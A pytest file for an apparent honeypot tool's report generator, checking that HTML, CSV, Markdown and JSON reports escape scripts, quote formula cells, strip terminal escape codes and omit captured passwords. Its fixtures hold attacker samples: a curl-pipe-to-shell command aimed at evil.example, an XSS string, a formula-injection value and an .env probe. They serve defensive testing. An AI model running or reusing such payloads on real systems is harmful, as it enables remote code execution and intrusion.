from __future__ import annotations

import json

from honeybot.cli import main
from honeybot.reconstruct import normalize, reconstruct
from honeybot.report import render_csv, render_html, render_markdown, render_report, report_json
from honeybot.store import Store

SECRET = "s3cr3t-report"


async def test_report_files_keep_attacks_and_drop_secrets(tmp_path):
    store = Store(tmp_path / "t.db", 8)
    await store.start()
    try:
        assert await store.open_session("aaa111", "203.0.113.10", 40000, 22, "ssh")
        await store.add_auth("aaa111", "root", SECRET, "password", True)
        raw = "curl http://evil.example/a.sh | sh\x1b[31m"
        await store.add_command("aaa111", raw, "exec", normalize(raw), 0)
        await store.add_command(
            "aaa111",
            "<script>alert(1)</script>",
            "shell",
            normalize("<script>alert(1)</script>"),
            0,
        )
        await store.upsert_ip(
            {
                "ip": "203.0.113.10",
                "asn": "64500",
                "org": "Evil Net",
                "country": "DE",
                "city": "Berlin",
                "isp": "Evil ISP",
                "spamhaus": "listed",
                "abuse_score": 80,
                "abuse_reports": 4,
            }
        )
        await _finish(store, "aaa111", banner="SSH-2.0-scanner", bytes_in=40)
        assert await store.open_session("bbb222", "203.0.113.11", 40001, 80, "http")
        await store.add_http("bbb222", "GET", "/.env", "x=1", "{}", "", 404)
        await _finish(store, "bbb222")
        await store.add_event("", "limit", "198.51.100.5")
        data = await store.report()
    finally:
        await store.stop()

    assert data["sessions"] == 2
    assert data["spamhaus_listed"] == 1
    assert data["auth"]["attempts"] == 1
    assert data["auth"]["accepted"] == 1
    assert data["timeline"]
    assert sum(row["n"] for row in data["timeline"]) == 2
    assert data["notable"][0]["primary_intent"] == "fetch_and_run"
    assert any(row["path"] == "/.env" for row in data["top_paths"])
    assert data["events"][0]["kind"] == "limit"
    blob = json.dumps(data, ensure_ascii=False, default=str)
    assert SECRET not in blob

    html = render_html(data)
    markdown = render_markdown(data)
    csv_text = render_csv(data)
    payload = json.loads(report_json(data))
    for text in (html, markdown, csv_text, report_json(data)):
        assert SECRET not in text
        assert "\x1b" not in text
    assert "<script>" not in html
    assert "&lt;script&gt;" in html
    assert "скачать и запустить" in html
    assert "Evil Net" in html
    assert "AbuseIPDB 80" in html
    assert "198.51.100.5" in html
    assert "Content-Security-Policy" in html
    assert "script-src 'none'" in html
    assert "aaa111" in csv_text
    assert "bbb222" in csv_text
    assert payload["kind"] == "honeybot-report"
    assert payload["summary"]["sessions"] == 2
    assert payload["notable"][0]["commands"]
    assert payload["sessions_truncated"] is False
    assert "curl" in markdown
    assert "^[" in markdown


def test_csv_quotes_formula_cells():
    text = render_csv(
        {
            "session_rows": [
                {
                    "id": "abc",
                    "summary": "=1+1",
                    "username": "+calc",
                    "command_count": 1,
                    "dst_port": 22,
                    "abuse_score": 3,
                }
            ]
        }
    )
    assert "'=1+1" in text
    assert "'+calc" in text
    assert text.startswith("\ufeff")


def test_html_survives_plain_stats_and_controls():
    html = render_html(
        {
            "sessions": 1,
            "unique_ips": 1,
            "spamhaus_listed": 0,
            "top_countries": [{"country": "US\x1b[2J", "n": 1}],
            "top_orgs": [],
            "top_ports": [],
            "top_commands": [{"command": "id\x1b[0m", "n": 1}],
            "recent": [],
        }
    )
    assert "Отчёт по атакам" in html
    assert "\x1b" not in html
    assert "US^[" in html


def test_unknown_report_format_is_rejected():
    try:
        render_report("pdf", {})
    except ValueError as exc:
        assert "html" in str(exc)
    else:
        raise AssertionError("чужой формат не должен проходить")


def test_cli_report_writes_html_and_rejects_pdf(tmp_path):
    missing = tmp_path / "no-such-config.toml"
    db = tmp_path / "t.db"
    out = tmp_path / "out.html"
    code = main(
        [
            "--config",
            str(missing),
            "--db",
            str(db),
            "report",
            "--format",
            "html",
            "--output",
            str(out),
        ]
    )
    assert code == 0
    text = out.read_text(encoding="utf-8")
    assert "Отчёт по атакам" in text
    assert "вся история" in text
    refused = main(
        ["--config", str(missing), "--db", str(db), "report", "--format", "pdf"]
    )
    assert refused == 2


def test_cli_report_json_on_stdout(tmp_path, capsys):
    code = main(
        [
            "--config",
            str(tmp_path / "missing.toml"),
            "--db",
            str(tmp_path / "t.db"),
            "report",
            "--format",
            "json",
        ]
    )
    assert code == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["kind"] == "honeybot-report"
    assert payload["summary"]["sessions"] == 0


async def _finish(store: Store, session_id: str, banner: str = "", bytes_in: int = 0) -> None:
    bundle = await store.bundle(session_id)
    result = reconstruct(bundle)
    await store.finish(
        session_id,
        result.primary,
        result.summary,
        result.command_tags,
        result.http_tags,
        bytes_in=bytes_in,
        banner=banner,
    )
    if session_id == "aaa111":
        assert result.primary == "fetch_and_run"
